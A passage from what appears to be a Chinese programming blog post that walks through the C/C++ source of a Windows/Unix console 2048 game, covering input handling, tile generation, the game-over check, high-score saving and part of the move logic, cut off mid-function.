<h4 id="退出游戏"><a href="#退出游戏" class="headerlink" title="退出游戏"></a>退出游戏</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_game</span><span class="params">(<span class="keyword">int</span> signal)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"cls"</span>);</span><br><span class="line">    CONSOLE_CURSOR_INFO info = &#123;<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="完整源代码"><a href="#完整源代码" class="headerlink" title="完整源代码"></a>完整源代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;   /* 包含设定随机数种子所需要的time()函数 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  /* 包含C的IO读写功能 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; /* 包含C标准库的功能 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32  <span class="comment">/* 指定是windows平台的游戏,并使用条件编译 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;direct.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Shlobj.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CODE_UP    0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CODE_DOWN  0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CODE_LEFT  0x44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CODE_RIGHT 0x43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_CODE_QUIT  0x71</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> config_path[<span class="number">4096</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">/* 配置文件路径 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init_game</span><span class="params">()</span></span>;    <span class="comment">/* 初始化游戏 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loop_game</span><span class="params">()</span></span>;    <span class="comment">/* 游戏循环 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reset_game</span><span class="params">()</span></span>;   <span class="comment">/* 重置游戏 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">release_game</span><span class="params">(<span class="keyword">int</span> signal)</span></span>; <span class="comment">/* 释放游戏 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_keyboard</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">move_left</span><span class="params">()</span></span>;  <span class="comment">/* 左移 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">move_right</span><span class="params">()</span></span>; <span class="comment">/* 右移 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">move_up</span><span class="params">()</span></span>;    <span class="comment">/* 上移 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">move_down</span><span class="params">()</span></span>;  <span class="comment">/* 下移 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_rand_num</span><span class="params">()</span></span>;    <span class="comment">/* 生成随机数，本程序中仅生成2或4，概率之比设为9:1 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_game_over</span><span class="params">()</span></span>; <span class="comment">/* 检测是否输掉游戏，设定游戏结束标志 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_null_count</span><span class="params">()</span></span>;   <span class="comment">/* 获取游戏面板上空位置数量 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">clear_screen</span><span class="params">()</span></span>;    <span class="comment">/* 清屏 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">refresh_show</span><span class="params">()</span></span>;    <span class="comment">/* 刷新界面显示 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> board[<span class="number">4</span>][<span class="number">4</span>];     <span class="comment">/* 游戏数字面板，抽象为二维数组 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> score;           <span class="comment">/* 游戏得分 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> best;            <span class="comment">/* 游戏最高分 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> if_need_add_num; <span class="comment">/* 是否需要生成随机数标志，1表示需要，0表示不需要 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> if_game_over;    <span class="comment">/* 是否游戏结束标志，1表示游戏结束，0表示正常 */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> if_prepare_exit; <span class="comment">/* 是否准备退出游戏，1表示是，0表示否 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* main函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	system(<span class="string">"color F1"</span>);<span class="comment">//修改界面颜色,第一位前景色,第二位背景色</span></span><br><span class="line">    init_game();<span class="comment">//初始化游戏 </span></span><br><span class="line">    loop_game();<span class="comment">//游戏循环 </span></span><br><span class="line">    release_game(<span class="number">0</span>);<span class="comment">//重置游戏 </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读取键盘*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_keyboard</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">    <span class="keyword">return</span> _getch();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">int</span> key_code;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, &amp;key_code, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;<span class="comment">//避免多输 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key_code;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 开始游戏 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop_game</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> cmd = read_keyboard(); <span class="comment">/* 接收标准输入流字符命令 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 判断是否准备退出游戏 */</span></span><br><span class="line">        <span class="keyword">if</span> (if_prepare_exit) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cmd == <span class="string">'y'</span> || cmd == <span class="string">'Y'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 退出游戏，清屏后退出 */</span></span><br><span class="line">                clear_screen();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="string">'n'</span> || cmd == <span class="string">'N'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 取消退出 */</span></span><br><span class="line">                if_prepare_exit = <span class="number">0</span>;</span><br><span class="line">                refresh_show();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 判断是否已经输掉游戏 */</span></span><br><span class="line">        <span class="keyword">if</span> (if_game_over) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cmd == <span class="string">'y'</span> || cmd == <span class="string">'Y'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 重玩游戏 */</span></span><br><span class="line">                reset_game();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="string">'n'</span> || cmd == <span class="string">'N'</span>) &#123;</span><br><span class="line">                <span class="comment">/* 退出游戏，清屏后退出  */</span></span><br><span class="line">                clear_screen();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if_need_add_num = <span class="number">0</span>; <span class="comment">/* 先设定不默认需要生成随机数，需要时再设定为1 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">        <span class="comment">/* 命令解析，w，s，a，d字符代表上下左右命令，q代表退出 */</span></span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">75</span>:move_left();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">80</span>:move_down();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">72</span>:move_up();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">77</span>:move_right();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'q'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="number">27</span>:if_prepare_exit = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:<span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="comment">/* 命令解析，上下左右箭头代表上下左右命令，q代表退出 */</span></span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_LEFT:move_left();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_DOWN:move_down();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_UP:move_up();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_RIGHT:move_right();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> KEY_CODE_QUIT:if_prepare_exit = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 打破得分纪录 */</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt; best) &#123;</span><br><span class="line">            best = score;</span><br><span class="line">            FILE *fp = fopen(config_path, <span class="string">"w"</span>);</span><br><span class="line">            <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">                fwrite(&amp;best, <span class="keyword">sizeof</span>(best), <span class="number">1</span>, fp);</span><br><span class="line">                fclose(fp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 默认为需要生成随机数时也同时需要刷新显示*/</span></span><br><span class="line">        <span class="keyword">if</span> (if_need_add_num) &#123;</span><br><span class="line">            add_rand_num();</span><br><span class="line">            refresh_show();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (if_prepare_exit) &#123;</span><br><span class="line">            refresh_show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 重置游戏*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_game</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    score = <span class="number">0</span>;</span><br><span class="line">    if_need_add_num = <span class="number">1</span>;</span><br><span class="line">    if_game_over = <span class="number">0</span>;</span><br><span class="line">    if_prepare_exit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 游戏初始化时出现的两个数一定会有个2，所以先随机生成一个2，其他均为0 */</span></span><br><span class="line">    <span class="keyword">int</span> n = rand() % <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            board[i][j] = (n-- == <span class="number">0</span> ? <span class="number">2</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 前面已经生成了一个2，这里再生成一个随机的2或者4，概率之比9:1 */</span></span><br><span class="line">    add_rand_num();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 在这里刷新界面并显示的时候，界面上已经默认出现了两个数字，其他的都为空（值为0） */</span></span><br><span class="line">    refresh_show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成随机数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rand_num</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>) time(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">int</span> n = rand() % get_null_count(); <span class="comment">/* 确定在何处空位置生成随机数 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">/* 定位待生成的位置 */</span></span><br><span class="line">            <span class="keyword">if</span> (board[i][j] == <span class="number">0</span> &amp;&amp; n-- == <span class="number">0</span>) &#123;</span><br><span class="line">                board[i][j] = (rand() % <span class="number">10</span> ? <span class="number">2</span> : <span class="number">4</span>); <span class="comment">/* 生成数字2或4，生成概率为9:1 */</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取空位置数量 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_null_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            board[i][j] == <span class="number">0</span> ? ++n : <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检查游戏是否结束 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_game_over</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">/* 横向和纵向比较挨着的两个元素是否相等，若有相等则游戏不结束 */</span></span><br><span class="line">            <span class="keyword">if</span> (board[i][j] == board[i][j + <span class="number">1</span>] || board[j][i] == board[j + <span class="number">1</span>][i]) &#123;</span><br><span class="line">                if_game_over = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if_game_over = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  左移 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_left</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 变量i用来遍历行项的下标，并且在移动时所有行相互独立，互不影响 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; 